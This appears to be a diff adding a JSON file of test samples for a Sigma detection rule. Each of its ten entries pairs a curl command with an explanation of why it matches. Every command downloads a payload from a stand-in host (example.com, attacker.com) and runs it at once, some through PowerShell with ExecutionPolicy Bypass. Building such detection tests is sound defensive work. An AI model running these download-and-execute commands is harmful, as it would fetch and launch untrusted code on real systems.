@@ -1,0 +1,42 @@
+[
+  {
+    "output": "cmd.exe /c curl.exe http://example.com/payload.exe -o payload.exe & .\\payload.exe",
+    "explanation": "This command matches the Sigma rule by using curl to download a payload and execute it immediately. It includes the required elements: 'curl', 'http', '-o', and '&' in the command line."
+  },
+  {
+    "output": "cmd.exe /c curl http://example.com/payload.exe > payload.exe & payload.exe",
+    "explanation": "This command uses curl to download a payload using redirection instead of '-o' and executes it. It matches the Sigma rule by including 'curl', 'http', and '&' in the command line."
+  },
+  {
+    "output": "powershell.exe -Command \"curl http://example.com/payload.exe -o payload.exe ; .\\payload.exe\"",
+    "explanation": "This command uses PowerShell to execute curl for downloading a payload and then executes it. It matches the Sigma rule by including 'curl', 'http', '-o', and the execution of the downloaded file."
+  },
+  {
+    "output": "curl --url http://attacker.com/script.bat --out script.bat && script.bat",
+    "explanation": "This command uses curl with the '--url' and '--out' options to download and execute a script. It matches the Sigma rule by including 'curl', 'http', and the execution of the downloaded file."
+  },
+  {
+    "output": "curl -s http://attacker.com/payload.ps1 --output payload.ps1 ; powershell -ExecutionPolicy Bypass -File payload.ps1",
+    "explanation": "This command downloads a PowerShell script using curl and executes it with PowerShell. It matches the Sigma rule by including 'curl', 'http', '-o', and the execution of the downloaded file."
+  },
+  {
+    "output": "curl -sL http://attacker.com/payload.exe -O && payload.exe",
+    "explanation": "This command uses curl with the '-sL' and '-O' options to download and execute a payload. It matches the Sigma rule by including 'curl', 'http', and the execution of the downloaded file."
+  },
+  {
+    "output": "curl http://attacker.com/payload.exe -o payload.exe && payload.exe",
+    "explanation": "This command uses curl to download a payload and execute it immediately. It matches the Sigma rule by including 'curl', 'http', '-o', and the execution of the downloaded file."
+  },
+  {
+    "output": "curl http://attacker.com/payload.exe -o payload.exe & .\\payload.exe",
+    "explanation": "This command uses curl to download a payload and executes it using a backslash-escaped path. It matches the Sigma rule by including 'curl', 'http', '-o', and the execution of the downloaded file."
+  },
+  {
+    "output": "curl http://attacker.com/payload.exe -o payload.exe & payload.exe",
+    "explanation": "This command uses curl to download a payload and executes it immediately. It matches the Sigma rule by including 'curl', 'http', '-o', and the execution of the downloaded file."
+  },
+  {
+    "output": "curl http://attacker.com/payload.exe -o p.exe & p.exe",
+    "explanation": "This command uses curl to download a payload with a shorter filename and executes it. It matches the Sigma rule by including 'curl', 'http', '-o', and the execution of the downloaded file."
+  }
+]
